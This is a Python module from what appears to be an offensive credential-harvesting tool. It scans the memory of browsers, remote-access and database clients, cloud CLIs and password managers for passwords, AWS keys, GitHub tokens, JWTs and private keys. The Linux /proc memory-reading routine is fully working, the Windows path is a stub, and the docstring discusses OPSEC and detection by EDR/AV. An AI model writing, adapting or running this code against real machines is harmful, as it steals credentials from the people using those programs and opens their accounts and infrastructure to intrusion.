"""
ProcessGrabber — Scan process memory for credential strings

Targets running processes that commonly hold secrets in memory:
- Web browsers (cleartext passwords during form submission)
- Remote desktop clients (session credentials)
- Database clients (connection strings)
- Cloud CLI tools (cached tokens)

This module reads /proc/<pid>/maps + /proc/<pid>/mem on Linux,
or uses ReadProcessMemory on Windows via ctypes.

Requires: Admin/SYSTEM privileges
MITRE ATT&CK: T1003.001 (LSASS Memory)

NOTE: This is the most OPSEC-risky module. Process memory reading is
commonly flagged by EDR/AV. Disabled by default — must be explicitly
enabled via --grabbers process.
"""

from __future__ import annotations

import os
import re

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel


# Credential patterns to search for in memory
_MEMORY_PATTERNS = [
    re.compile(p) for p in [
        rb"(?:password|passwd|pwd)\s*[=:]\s*[^\x00\s]{4,64}",
        rb"AKIA[0-9A-Z]{16}",
        rb"-----BEGIN\s(?:RSA\s)?PRIVATE\sKEY-----",
        rb"gh[ps]_[A-Za-z0-9_]{36,}",
        rb"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
    ]
]

# Processes worth scanning
_TARGET_PROCESSES = {
    "chrome.exe", "msedge.exe", "firefox.exe", "brave.exe",
    "mstsc.exe", "putty.exe", "winscp.exe", "filezilla.exe",
    "ssms.exe", "dbeaver.exe", "pgadmin4.exe",
    "aws.exe", "az.exe", "gcloud.exe", "kubectl.exe",
    "keepass.exe", "1password.exe",
}


class ProcessGrabber(GrabberModule):
    name = "process"
    description = "Scan process memory for credential strings (OPSEC risk!)"
    min_privilege = PrivilegeLevel.ADMIN
    supported_platforms = ("Windows", "Linux")
    default_enabled = False  # Must be explicitly enabled

    def preflight_check(self, context: GrabberContext) -> bool:
        return context.is_admin

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        if context.is_windows:
            creds = self._scan_windows_processes()
        else:
            creds = self._scan_linux_processes()

        result.credentials.extend(creds)
        if creds:
            result.findings.append(self.make_finding(
                file_path="PROCESS_MEMORY",
                description=f"Found {len(creds)} credential-like string(s) in process memory",
                score=100 * min(len(creds), 3),
                matched_value="process_memory",
            ))

        result.status = GrabberStatus.COMPLETED
        return result

    def _scan_windows_processes(self) -> list[ExtractedCredential]:
        """Scan Windows process memory using ctypes ReadProcessMemory."""
        # Placeholder — full implementation requires significant ctypes work
        # (OpenProcess, VirtualQueryEx, ReadProcessMemory, CloseHandle)
        self.logger.info("Windows process memory scanning not yet implemented")
        return []

    def _scan_linux_processes(self) -> list[ExtractedCredential]:
        """Scan Linux process memory via /proc filesystem."""
        creds = []

        if not os.path.isdir("/proc"):
            return creds

        try:
            for pid_dir in os.listdir("/proc"):
                if not pid_dir.isdigit():
                    continue

                # Read process name
                try:
                    with open(f"/proc/{pid_dir}/comm", "r") as f:
                        proc_name = f.read().strip()
                except (OSError, PermissionError):
                    continue

                # Only scan interesting processes
                if proc_name.lower() not in _TARGET_PROCESSES and not any(
                    t.replace(".exe", "") in proc_name.lower() for t in _TARGET_PROCESSES
                ):
                    continue

                # Read memory maps and scan readable regions
                try:
                    found = self._scan_proc_memory(pid_dir, proc_name)
                    creds.extend(found)
                except (OSError, PermissionError):
                    continue

                if len(creds) >= 20:
                    break

        except OSError:
            pass

        return creds

    def _scan_proc_memory(self, pid: str, proc_name: str) -> list[ExtractedCredential]:
        """Scan a single process's memory regions for secrets."""
        creds = []

        try:
            with open(f"/proc/{pid}/maps", "r") as f:
                maps = f.readlines()

            with open(f"/proc/{pid}/mem", "rb") as mem_file:
                for line in maps:
                    parts = line.split()
                    if len(parts) < 2:
                        continue
                    if "r" not in parts[1]:  # Not readable
                        continue

                    addr_range = parts[0].split("-")
                    start = int(addr_range[0], 16)
                    end = int(addr_range[1], 16)
                    size = end - start

                    # Skip very large or very small regions
                    if size > 10 * 1024 * 1024 or size < 1024:
                        continue

                    try:
                        mem_file.seek(start)
                        data = mem_file.read(min(size, 1024 * 1024))  # 1MB cap per region
                    except (OSError, ValueError):
                        continue

                    for pattern in _MEMORY_PATTERNS:
                        for match in pattern.finditer(data):
                            try:
                                value = match.group().decode("utf-8", errors="ignore")
                            except Exception:
                                continue

                            creds.append(ExtractedCredential(
                                source_module=self.name,
                                credential_type="password",
                                target_application=f"Process: {proc_name} (PID {pid})",
                                decrypted_value=value[:200],
                                notes=f"Found at memory offset 0x{start + match.start():x}",
                                mitre_technique="T1003.001",
                            ))

                            if len(creds) >= 10:
                                return creds

        except (OSError, PermissionError):
            pass

        return creds
